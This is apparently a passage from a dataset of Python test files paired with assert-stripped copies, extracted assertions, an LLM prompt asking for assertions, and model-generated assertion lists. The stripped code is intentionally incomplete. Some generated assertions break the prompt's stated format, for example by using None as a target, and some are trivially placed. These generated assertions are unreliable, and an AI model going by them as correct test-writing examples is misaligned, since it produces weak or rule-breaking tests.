        pos = pos_to_offset(colored, 6)
        assert pos == 19
        assert colored[pos] == 'A'

        pos = pos_to_offset(colored, len(line) - 1)
        assert pos == 24
        assert colored[pos] == 'a'


    def pos_to_offset_1_test(self):
        line = 'Hello Africa'
        colored = self.white_fg + ' ' + self.yellow_fg + line + self.config.color.reset
        pos = pos_to_offset(colored, 1)
        assert pos == 23
        assert colored[pos] == 'H'


    def bg_highlight_1_test(self):
        self.reg_bg = fg2bg(self.red_fg)
        line = 'Hello Africa'
        line = self.yellow_fg + line + self.config.color.reset

        pos = pos_to_offset(line, 0)
        assert line[pos] == 'H'
        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
          + line[pos+1:]
        assert line == '\x1b[0m\x1b[33m\x1b[1m\x1b[41mH\x1b[48mello Africa\x1b[0m'

        pos = pos_to_offset(line, 6)
        assert line[pos] == 'A'
        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
          + line[pos+1:]
        assert line == '\x1b[0m\x1b[33m\x1b[1m\x1b[41mH\x1b[48mello \x1b[41mA\x1b[48mfrica\x1b[0m'

        pos = pos_to_offset(line, 11)
        assert line[pos] == 'a'
        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
          + line[pos+1:]
        assert line == '\x1b[0m\x1b[33m\x1b[1m\x1b[41mH\x1b[48mello \x1b[41mA\x1b[48mfric\x1b[41ma\x1b[48m\x1b[0m'


    def _format_range_as_to_columns(self, count, columns):
        result = ''
        line = ''
        for i in column_formatter(count, columns):
            if i == -1:
                #print(line)
                result += line + '\n'
                line = ''
            else:
                line += '{} '.format(i)
        return result


    def test_column_formatter_0(self):
        for i in column_formatter(0, 1):
            self.assertFalse()


    def column_formatter_1_2_test(self):
        expected = '0 \n'
        result = self._format_range_as_to_columns(1, 2)
        assert expected == result


    def column_formatter_10_4_test(self):
        expected = '0 3 6 9 \n1 4 7 \n2 5 8 \n'
        result = self._format_range_as_to_columns(10, 4)
        assert expected == result


    def column_formatter_10_3_test(self):
        expected = '0 4 8 \n1 5 9 \n2 6 \n3 7 \n'
        result = self._format_range_as_to_columns(10, 3)
        assert expected == result
","
1# -*- coding: utf-8 -*-
2#
3# This file is a part of Pluggable Output Processor
4#
5# Copyright (c) 2013-2017 Alex Turbov <i.zaufi@gmail.com>
6#
7# Pluggable Output Processor is free software: you can redistribute it and/or modify it
8# under the terms of the GNU General Public License as published by the
9# Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# Pluggable Output Processor is distributed in the hope that it will be useful, but
13# WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
15# See the GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License along
18# with this program.  If not, see <http://www.gnu.org/licenses/>.
19
20'''
21    Unit tests for terminal helpers
22'''
23
24# Project specific imports
25from outproc.config import Config
26from outproc.term import column_formatter, fg2bg, pos_to_offset
27
28# Standard imports
29import pathlib
30
31
32class term_module_tester:
33
34    def setup_method(self):
35        self.config = Config(pathlib.Path('doesnt-matter'))
36        self.red_fg = self.config.get_color('some', 'red', with_reset=False)
37        self.yellow_fg = self.config.get_color('some', 'yellow+bold')
38        self.white_fg = self.config.get_color('some', 'white')
39
40
41    def fg2bg_test(self):
42
43
44    def pos_to_offset_0_test(self):
45        line = 'Hello Africa'
46        colored = self.yellow_fg + line + self.config.color.reset
47        #print('{}'.format(repr(colored)))
48
49        pos = pos_to_offset(colored, 0)
50
51        pos = pos_to_offset(colored, 6)
52
53        pos = pos_to_offset(colored, len(line) - 1)
54
55
56    def pos_to_offset_1_test(self):
57        line = 'Hello Africa'
58        colored = self.white_fg + ' ' + self.yellow_fg + line + self.config.color.reset
59        pos = pos_to_offset(colored, 1)
60
61
62    def bg_highlight_1_test(self):
63        self.reg_bg = fg2bg(self.red_fg)
64        line = 'Hello Africa'
65        line = self.yellow_fg + line + self.config.color.reset
66
67        pos = pos_to_offset(line, 0)
68        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
69          + line[pos+1:]
70
71        pos = pos_to_offset(line, 6)
72        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
73          + line[pos+1:]
74
75        pos = pos_to_offset(line, 11)
76        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
77          + line[pos+1:]
78
79
80    def _format_range_as_to_columns(self, count, columns):
81        result = ''
82        line = ''
83        for i in column_formatter(count, columns):
84            if i == -1:
85                #print(line)
86                result += line + '\n'
87                line = ''
88            else:
89                line += '{} '.format(i)
90        return result
91
92
93    def test_column_formatter_0(self):
94        for i in column_formatter(0, 1):
95
96
97    def column_formatter_1_2_test(self):
98        expected = '0 \n'
99        result = self._format_range_as_to_columns(1, 2)
100
101
102    def column_formatter_10_4_test(self):
103        expected = '0 3 6 9 \n1 4 7 \n2 5 8 \n'
104        result = self._format_range_as_to_columns(10, 4)
105
106
107    def column_formatter_10_3_test(self):
108        expected = '0 4 8 \n1 5 9 \n2 6 \n3 7 \n'
109        result = self._format_range_as_to_columns(10, 3)
110","[['fg2bg(self.red_fg)', '==', ""'\\x1b[41m'""], ['pos', '==', '13'], ['colored[pos]', '==', ""'H'""], ['pos', '==', '19'], ['colored[pos]', '==', ""'A'""], ['pos', '==', '24'], ['colored[pos]', '==', ""'a'""], ['pos', '==', '23'], ['colored[pos]', '==', ""'H'""], ['line[pos]', '==', ""'H'""], ['line', '==', ""'\\x1b[0m\\x1b[33m\\x1b[1m\\x1b[41mH\\x1b[48mello Africa\\x1b[0m'""], ['line[pos]', '==', ""'A'""], ['line', '==', ""'\\x1b[0m\\x1b[33m\\x1b[1m\\x1b[41mH\\x1b[48mello \\x1b[41mA\\x1b[48mfrica\\x1b[0m'""], ['line[pos]', '==', ""'a'""], ['line', '==', ""'\\x1b[0m\\x1b[33m\\x1b[1m\\x1b[41mH\\x1b[48mello \\x1b[41mA\\x1b[48mfric\\x1b[41ma\\x1b[48m\\x1b[0m'""], ['expected', '==', 'result'], ['expected', '==', 'result'], ['expected', '==', 'result']]",19,18,0.9473684210526316,0.0043175821539937,"['self.config', 'self.red_fg', 'self.yellow_fg', 'self.white_fg', 'line', 'colored', 'pos', 'self.reg_bg', 'count', 'columns', 'result', 'expected']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.config', 'self.red_fg', 'self.yellow_fg', 'self.white_fg', 'line', 'colored', 'pos', 'self.reg_bg', 'count', 'columns', 'result', 'expected']
*Code:

1# -*- coding: utf-8 -*-
2#
3# This file is a part of Pluggable Output Processor
4#
5# Copyright (c) 2013-2017 Alex Turbov <i.zaufi@gmail.com>
6#
7# Pluggable Output Processor is free software: you can redistribute it and/or modify it
8# under the terms of the GNU General Public License as published by the
9# Free Software Foundation, either version 3 of the License, or
10# (at your option) any later version.
11#
12# Pluggable Output Processor is distributed in the hope that it will be useful, but
13# WITHOUT ANY WARRANTY; without even the implied warranty of
14# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
15# See the GNU General Public License for more details.
16#
17# You should have received a copy of the GNU General Public License along
18# with this program.  If not, see <http://www.gnu.org/licenses/>.
19
20'''
21    Unit tests for terminal helpers
22'''
23
24# Project specific imports
25from outproc.config import Config
26from outproc.term import column_formatter, fg2bg, pos_to_offset
27
28# Standard imports
29import pathlib
30
31
32class term_module_tester:
33
34    def setup_method(self):
35        self.config = Config(pathlib.Path('doesnt-matter'))
36        self.red_fg = self.config.get_color('some', 'red', with_reset=False)
37        self.yellow_fg = self.config.get_color('some', 'yellow+bold')
38        self.white_fg = self.config.get_color('some', 'white')
39
40
41    def fg2bg_test(self):
42
43
44    def pos_to_offset_0_test(self):
45        line = 'Hello Africa'
46        colored = self.yellow_fg + line + self.config.color.reset
47        #print('{}'.format(repr(colored)))
48
49        pos = pos_to_offset(colored, 0)
50
51        pos = pos_to_offset(colored, 6)
52
53        pos = pos_to_offset(colored, len(line) - 1)
54
55
56    def pos_to_offset_1_test(self):
57        line = 'Hello Africa'
58        colored = self.white_fg + ' ' + self.yellow_fg + line + self.config.color.reset
59        pos = pos_to_offset(colored, 1)
60
61
62    def bg_highlight_1_test(self):
63        self.reg_bg = fg2bg(self.red_fg)
64        line = 'Hello Africa'
65        line = self.yellow_fg + line + self.config.color.reset
66
67        pos = pos_to_offset(line, 0)
68        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
69          + line[pos+1:]
70
71        pos = pos_to_offset(line, 6)
72        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
73          + line[pos+1:]
74
75        pos = pos_to_offset(line, 11)
76        line = line[:pos] + self.reg_bg + line[pos:pos+1] + self.config.color.normal_bg \
77          + line[pos+1:]
78
79
80    def _format_range_as_to_columns(self, count, columns):
81        result = ''
82        line = ''
83        for i in column_formatter(count, columns):
84            if i == -1:
85                #print(line)
86                result += line + '\n'
87                line = ''
88            else:
89                line += '{} '.format(i)
90        return result
91
92
93    def test_column_formatter_0(self):
94        for i in column_formatter(0, 1):
95
96
97    def column_formatter_1_2_test(self):
98        expected = '0 \n'
99        result = self._format_range_as_to_columns(1, 2)
100
101
102    def column_formatter_10_4_test(self):
103        expected = '0 3 6 9 \n1 4 7 \n2 5 8 \n'
104        result = self._format_range_as_to_columns(10, 4)
105
106
107    def column_formatter_10_3_test(self):
108        expected = '0 4 8 \n1 5 9 \n2 6 \n3 7 \n'
109        result = self._format_range_as_to_columns(10, 3)
110",5106,"[[34, 'self.config', '!=', None, ""Settings loading process might fail""],
[36, 'self.red_fg', '!=', None, ""Color registration process might fail""],
[37, 'self.yellow_fg', '!=', None, ""Color registration process might fail""],
[38, 'self.white_fg', '!=', None, ""Color registration process might fail""],
[45, 'line', '!=', '', ""String to undergo processing shouldn't be empty""],
[46, 'colored', '!=', None, ""Color formatting process might fail""],
[49, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[51, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[53, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[57, 'line', '!=', '', ""String to undergo processing shouldn't be empty""],
[58, 'colored', '!=', None, ""Color formatting process might fail""],
[59, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[63, 'self.reg_bg', '!=', None, ""Color conversion process might fail""],
[67, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[71, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[75, 'pos', '>=', 0, ""Calculated position shouldn't be negative""],
[80, 'count', '>=', 0, ""Count of columns should be non negative""],
[80, 'columns', '>=', 0, ""Number of columns should be non negative""],
[90, 'result', '!=', None, ""Formatted string generation process shouldn't result in None""],
[98, 'expected', '!=', '', ""Test expectation should be non empty""],
[99, 'result', '!=', None, ""Formatted string generation process shouldn't result in None""],
[103, 'expected', '!=', '', ""Test expectation should be non empty""],
[104, 'result', '!=', None, ""Formatted string generation process shouldn't result in None""],
[108, 'expected', '!=', '', ""Test expectation should be non empty""],
[109, 'result', '!=', None, ""Formatted string generation process shouldn't result in None""]]"
keflavich/TurbuStat,"# Licensed under an MIT open source license - see LICENSE

'''
Test functions for PCA
'''

from unittest import TestCase

import numpy as np
import numpy.testing as npt

from ..statistics import PCA, PCA_Distance
from ._testing_data import \
    dataset1, dataset2, computed_data, computed_distances


class testPCA(TestCase):

    def setUp(self):
        self.dataset1 = dataset1
        self.dataset2 = dataset2

    def test_PCA_method(self):
        self.tester = PCA(dataset1[""cube""][0], n_eigs=50)
        self.tester.run()
        assert np.allclose(self.tester.eigvals, computed_data['pca_val'])

    def test_PCA_distance(self):
        self.tester_dist = \
            PCA_Distance(dataset1[""cube""][0],
                         dataset2[""cube""][0]).distance_metric()
        npt.assert_almost_equal(self.tester_dist.distance,
                                computed_distances['pca_distance'])
","
1# Licensed under an MIT open source license - see LICENSE
2
3'''
4Test functions for PCA
5'''
6
7from unittest import TestCase
8
9import numpy as np
10import numpy.testing as npt
11
12from ..statistics import PCA, PCA_Distance
13from ._testing_data import \
14    dataset1, dataset2, computed_data, computed_distances
15
16
17class testPCA(TestCase):
18
19    def setUp(self):
20        self.dataset1 = dataset1
21        self.dataset2 = dataset2
22
23    def test_PCA_method(self):
24        self.tester = PCA(dataset1[""cube""][0], n_eigs=50)
25        self.tester.run()
26
27    def test_PCA_distance(self):
28        self.tester_dist = \
29            PCA_Distance(dataset1[""cube""][0],
30                         dataset2[""cube""][0]).distance_metric()
31                                computed_distances['pca_distance'])
32","[['np.allclose(self.tester.eigvals', '==', 'True']]",2,1,0.5,0.0011049723756906,"['self.dataset1', 'self.dataset2', 'self.tester', 'self.tester_dist']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.dataset1', 'self.dataset2', 'self.tester', 'self.tester_dist']
*Code:

1# Licensed under an MIT open source license - see LICENSE
2
3'''
4Test functions for PCA
5'''
6
7from unittest import TestCase
8
9import numpy as np
10import numpy.testing as npt
11
12from ..statistics import PCA, PCA_Distance
13from ._testing_data import \
14    dataset1, dataset2, computed_data, computed_distances
15
16
17class testPCA(TestCase):
18
19    def setUp(self):
20        self.dataset1 = dataset1
21        self.dataset2 = dataset2
22
23    def test_PCA_method(self):
24        self.tester = PCA(dataset1[""cube""][0], n_eigs=50)
25        self.tester.run()
26
27    def test_PCA_distance(self):
28        self.tester_dist = \
29            PCA_Distance(dataset1[""cube""][0],
30                         dataset2[""cube""][0]).distance_metric()
31                                computed_distances['pca_distance'])
32",2277,"[[20, 'self.dataset1', '!=', None, ""dataset1 should be initialized before its use""],
 [21, 'self.dataset2', '!=', None, ""dataset2 should be initialized before its use""],
 [24, 'self.tester', '!=', None, ""tester should be initialized before its use""],
 [28, 'self.tester_dist', '!=', None, ""tester_dist should be initialized before its use""]]"
City-of-Helsinki/kuulemma,"# -*- coding: utf-8 -*-
# Kuulemma
# Copyright (C) 2014, Fast Monkeys Oy
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import json

import pytest
from flask import url_for

from tests.factories import LikeFactory, UserFactory
from tests.utils import login_user


@pytest.mark.usefixtures('request_ctx')
def test_index_url():
    assert (
        url_for('like.index', user_id=1) ==
        '/users/1/links/likes'
    )


@pytest.mark.usefixtures('database', 'request_ctx')
class TestIndexOnSuccess(object):
    @pytest.fixture
    def user(self):
        return UserFactory()

    @pytest.fixture
    def like(self, user):
        return LikeFactory(user=user)

    @pytest.fixture
    def response(self, client, user, like):
        login_user(client, user)
        return client.get(
            url_for('like.index', user_id=user.id)
        )

    def test_returns_200(self, response):
        assert response.status_code == 200

    def test_returns_list_of_liked_comment_ids(
        self, response, like
    ):
        content = response.data.decode('utf8')
        assert str(like.comment_id) in content

    def test_returns_empty_list_if_there_are_no_likes(self, client):
        another_user = UserFactory()
        login_user(client, another_user)
        response = client.get(
            url_for('like.index', user_id=another_user.id)
        )
        content = response.data.decode('utf8')
        assert '[]' in content


@pytest.mark.usefixtures('database', 'request_ctx')
class TestIndexOnError(object):
    @pytest.fixture
    def user(self):
        return UserFactory()

    def test_returns_404_if_user_does_not_exist(self, client):
        response = client.get(
            url_for('like.index', user_id=999)
        )
        assert response.status_code == 404

    def test_returns_401_if_user_is_not_authenticated(self, client, user):
        response = client.get(
            url_for('like.index', user_id=user.id)
        )
        assert response.status_code == 401

    def test_returns_404_if_hearing_does_not_exist(self, client, user):
        login_user(client, user)
        response = client.get(
            url_for('like.index', user_id=user.id),
            data=json.dumps({'hearing_id': 999}),
            content_type='application/json'
        )
        assert response.status_code == 404
","
1# -*- coding: utf-8 -*-
2# Kuulemma
3# Copyright (C) 2014, Fast Monkeys Oy
4#
5# This program is free software: you can redistribute it and/or modify
6# it under the terms of the GNU Affero General Public License as published by
7# the Free Software Foundation, either version 3 of the License, or
8# (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU Affero General Public License for more details.
14#
15# You should have received a copy of the GNU Affero General Public License
16# along with this program.  If not, see <http://www.gnu.org/licenses/>.
17
18import json
19
20import pytest
21from flask import url_for
22
23from tests.factories import LikeFactory, UserFactory
24from tests.utils import login_user
25
26
27@pytest.mark.usefixtures('request_ctx')
28def test_index_url():
29        url_for('like.index', user_id=1) ==
30        '/users/1/links/likes'
31    )
32
33
34@pytest.mark.usefixtures('database', 'request_ctx')
35class TestIndexOnSuccess(object):
36    @pytest.fixture
37    def user(self):
38        return UserFactory()
39
40    @pytest.fixture
41    def like(self, user):
42        return LikeFactory(user=user)
43
44    @pytest.fixture
45    def response(self, client, user, like):
46        login_user(client, user)
47        return client.get(
48            url_for('like.index', user_id=user.id)
49        )
50
51    def test_returns_200(self, response):
52
53    def test_returns_list_of_liked_comment_ids(
54        self, response, like
55    ):
56        content = response.data.decode('utf8')
57
58    def test_returns_empty_list_if_there_are_no_likes(self, client):
59        another_user = UserFactory()
60        login_user(client, another_user)
61        response = client.get(
62            url_for('like.index', user_id=another_user.id)
63        )
64        content = response.data.decode('utf8')
65
66
67@pytest.mark.usefixtures('database', 'request_ctx')
68class TestIndexOnError(object):
69    @pytest.fixture
70    def user(self):
71        return UserFactory()
72
73    def test_returns_404_if_user_does_not_exist(self, client):
74        response = client.get(
75            url_for('like.index', user_id=999)
76        )
77
78    def test_returns_401_if_user_is_not_authenticated(self, client, user):
79        response = client.get(
80            url_for('like.index', user_id=user.id)
81        )
82
83    def test_returns_404_if_hearing_does_not_exist(self, client, user):
84        login_user(client, user)
85        response = client.get(
86            url_for('like.index', user_id=user.id),
87            data=json.dumps({'hearing_id': 999}),
88            content_type='application/json'
89        )
90","[['(', '==', 'True'], ['response.status_code', '==', '200'], ['response.status_code', '==', '404'], ['response.status_code', '==', '401'], ['response.status_code', '==', '404']]",7,5,0.7142857142857143,0.00169664065151,"['user', 'client', 'like', 'response', 'content', 'another_user']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['user', 'client', 'like', 'response', 'content', 'another_user']
*Code:

1# -*- coding: utf-8 -*-
2# Kuulemma
3# Copyright (C) 2014, Fast Monkeys Oy
4#
5# This program is free software: you can redistribute it and/or modify
6# it under the terms of the GNU Affero General Public License as published by
7# the Free Software Foundation, either version 3 of the License, or
8# (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU Affero General Public License for more details.
14#
15# You should have received a copy of the GNU Affero General Public License
16# along with this program.  If not, see <http://www.gnu.org/licenses/>.
17
18import json
19
20import pytest
21from flask import url_for
22
23from tests.factories import LikeFactory, UserFactory
24from tests.utils import login_user
25
26
27@pytest.mark.usefixtures('request_ctx')
28def test_index_url():
29        url_for('like.index', user_id=1) ==
30        '/users/1/links/likes'
31    )
32
33
34@pytest.mark.usefixtures('database', 'request_ctx')
35class TestIndexOnSuccess(object):
36    @pytest.fixture
37    def user(self):
38        return UserFactory()
39
40    @pytest.fixture
41    def like(self, user):
42        return LikeFactory(user=user)
43
44    @pytest.fixture
45    def response(self, client, user, like):
46        login_user(client, user)
47        return client.get(
48            url_for('like.index', user_id=user.id)
49        )
50
51    def test_returns_200(self, response):
52
53    def test_returns_list_of_liked_comment_ids(
54        self, response, like
55    ):
56        content = response.data.decode('utf8')
57
58    def test_returns_empty_list_if_there_are_no_likes(self, client):
59        another_user = UserFactory()
60        login_user(client, another_user)
61        response = client.get(
62            url_for('like.index', user_id=another_user.id)
63        )
64        content = response.data.decode('utf8')
65
66
67@pytest.mark.usefixtures('database', 'request_ctx')
68class TestIndexOnError(object):
69    @pytest.fixture
70    def user(self):
71        return UserFactory()
72
73    def test_returns_404_if_user_does_not_exist(self, client):
74        response = client.get(
75            url_for('like.index', user_id=999)
76        )
77
78    def test_returns_401_if_user_is_not_authenticated(self, client, user):
79        response = client.get(
80            url_for('like.index', user_id=user.id)
81        )
82
83    def test_returns_404_if_hearing_does_not_exist(self, client, user):
84        login_user(client, user)
85        response = client.get(
86            url_for('like.index', user_id=user.id),
87            data=json.dumps({'hearing_id': 999}),
88            content_type='application/json'
89        )
90",4301,"[[37, 'user', '!=', None, ""A user must be created for the test""],
[41, 'like', '!=', None, ""A like must be created for the test""],
[41, 'user', '!=', None, ""A user must exist for the like creation in the test""],
[45, 'response', '!=', None, ""A response must be obtained for the test""],
[45, 'client', '!=', None, ""Client must exist for the login and response acquisition""],
[45, 'user', '!=', None, ""User must exist for the login and response acquisition""],
[45, 'like', '!=', None, ""Like must exist for the response acquisition""],
[59, 'another_user', '!=', None, ""Another user must be created for the test""],
[59, 'client', '!=', None, ""Client must exist for the login and response acquisition""],
[71, 'user', '!=', None, ""User must exist for the test""],
[73, 'client', '!=', None, ""Client must exist for the response acquisition""],
[78, 'client', '!=', None, ""Client must exist for the response acquisition""],
[78, 'user', '!=', None, ""User must exist for the response acquisition""],
[83, 'client', '!=', None, ""Client must exist for the response acquisition""],
[83, 'user', '!=', None, ""User must exist for the login and response acquisition""]]"
BlackHole/enigma2-1,"from Source import Source
from Components.Element import cached

class List(Source, object):
	""""""The datasource of a listbox. Currently, the format depends on the used converter. So
if you put a simple string list in here, you need to use a StringList converter, if you are
using a ""multi content list styled""-list, you need to use the StaticMultiList converter, and
setup the ""fonts"".

This has been done so another converter could convert the list to a different format, for example
to generate HTML.""""""
	def __init__(self, list=None, enableWrapAround=False, item_height=25, fonts=None):
		if not list: list = []
		if not fonts: fonts = []
		Source.__init__(self)
		self.__list = list
		self.onSelectionChanged = [ ]
		self.item_height = item_height
		self.fonts = fonts
		self.disable_callbacks = False
		self.enableWrapAround = enableWrapAround
		self.__style = ""default"" # style might be an optional string which can be used to define different visualisations in the skin

	def setList(self, list):
		self.__list = list
		self.changed((self.CHANGED_ALL,))

	list = property(lambda self: self.__list, setList)

	def entry_changed(self, index):
		if not self.disable_callbacks:
			self.downstream_elements.entry_changed(index)

	def modifyEntry(self, index, data):
		self.__list[index] = data
		self.entry_changed(index)

	def count(self):
		return len(self.__list)

	def selectionChanged(self, index):
		if self.disable_callbacks:
			return

		# update all non-master targets
		for x in self.downstream_elements:
			if x is not self.master:
				x.index = index

		for x in self.onSelectionChanged:
			x()

	@cached
	def getCurrent(self):
		return self.master is not None and self.master.current

	current = property(getCurrent)

	def setIndex(self, index):
		if self.master is not None:
			self.master.index = index
			self.selectionChanged(index)

	@cached
	def getIndex(self):
		if self.master is not None:
			return self.master.index
		else:
			return None

	setCurrentIndex = setIndex

	index = property(getIndex, setIndex)

	def selectNext(self):
		if self.getIndex() + 1 >= self.count():
			if self.enableWrapAround:
				self.index = 0
		else:
			self.index += 1
		self.setIndex(self.index)

	def selectPrevious(self):
		if self.getIndex() - 1 < 0:
			if self.enableWrapAround:
				self.index = self.count() - 1
		else:
			self.index -= 1
		self.setIndex(self.index)

	@cached
	def getStyle(self):
		return self.__style

	def setStyle(self, style):
		if self.__style != style:
			self.__style = style
			self.changed((self.CHANGED_SPECIFIC, ""style""))

	style = property(getStyle, setStyle)

	def updateList(self, list):
		""""""Changes the list without changing the selection or emitting changed Events""""""
		assert len(list) == len(self.__list)
		old_index = self.index
		self.disable_callbacks = True
		self.list = list
		self.index = old_index
		self.disable_callbacks = False

	def pageUp(self):
		if self.getIndex() == 0:
			self.index = self.count() - 1
		elif self.getIndex() - 10 < 0:
			self.index = 0
		else:
			self.index -= 10
		self.setIndex(self.index)

	def pageDown(self):
		if self.getIndex() == self.count() - 1:
			self.index = 0
		elif self.getIndex() + 10 >= self.count():
			self.index = self.count() - 1
		else:
			self.index += 10
		self.setIndex(self.index)

	def up(self):
		self.selectPrevious()
		
	def down(self):
		self.selectNext()

	def getSelectedIndex(self):
		return self.getIndex()","
1from Source import Source
2from Components.Element import cached
3
4class List(Source, object):
5	""""""The datasource of a listbox. Currently, the format depends on the used converter. So
6if you put a simple string list in here, you need to use a StringList converter, if you are
7using a ""multi content list styled""-list, you need to use the StaticMultiList converter, and
8setup the ""fonts"".
9
10This has been done so another converter could convert the list to a different format, for example
11to generate HTML.""""""
12	def __init__(self, list=None, enableWrapAround=False, item_height=25, fonts=None):
13		if not list: list = []
14		if not fonts: fonts = []
15		Source.__init__(self)
16		self.__list = list
17		self.onSelectionChanged = [ ]
18		self.item_height = item_height
19		self.fonts = fonts
20		self.disable_callbacks = False
21		self.enableWrapAround = enableWrapAround
22		self.__style = ""default"" # style might be an optional string which can be used to define different visualisations in the skin
23
24	def setList(self, list):
25		self.__list = list
26		self.changed((self.CHANGED_ALL,))
27
28	list = property(lambda self: self.__list, setList)
29
30	def entry_changed(self, index):
31		if not self.disable_callbacks:
32			self.downstream_elements.entry_changed(index)
33
34	def modifyEntry(self, index, data):
35		self.__list[index] = data
36		self.entry_changed(index)
37
38	def count(self):
39		return len(self.__list)
40
41	def selectionChanged(self, index):
42		if self.disable_callbacks:
43			return
44
45		# update all non-master targets
46		for x in self.downstream_elements:
47			if x is not self.master:
48				x.index = index
49
50		for x in self.onSelectionChanged:
51			x()
52
53	@cached
54	def getCurrent(self):
55		return self.master is not None and self.master.current
56
57	current = property(getCurrent)
58
59	def setIndex(self, index):
60		if self.master is not None:
61			self.master.index = index
62			self.selectionChanged(index)
63
64	@cached
65	def getIndex(self):
66		if self.master is not None:
67			return self.master.index
68		else:
69			return None
70
71	setCurrentIndex = setIndex
72
73	index = property(getIndex, setIndex)
74
75	def selectNext(self):
76		if self.getIndex() + 1 >= self.count():
77			if self.enableWrapAround:
78				self.index = 0
79		else:
80			self.index += 1
81		self.setIndex(self.index)
82
83	def selectPrevious(self):
84		if self.getIndex() - 1 < 0:
85			if self.enableWrapAround:
86				self.index = self.count() - 1
87		else:
88			self.index -= 1
89		self.setIndex(self.index)
90
91	@cached
92	def getStyle(self):
93		return self.__style
94
95	def setStyle(self, style):
96		if self.__style != style:
97			self.__style = style
98			self.changed((self.CHANGED_SPECIFIC, ""style""))
99
100	style = property(getStyle, setStyle)
101
102	def updateList(self, list):
103		""""""Changes the list without changing the selection or emitting changed Events""""""
104		old_index = self.index
105		self.disable_callbacks = True
106		self.list = list
107		self.index = old_index
108		self.disable_callbacks = False
109
110	def pageUp(self):
111		if self.getIndex() == 0:
112			self.index = self.count() - 1
113		elif self.getIndex() - 10 < 0:
114			self.index = 0
115		else:
116			self.index -= 10
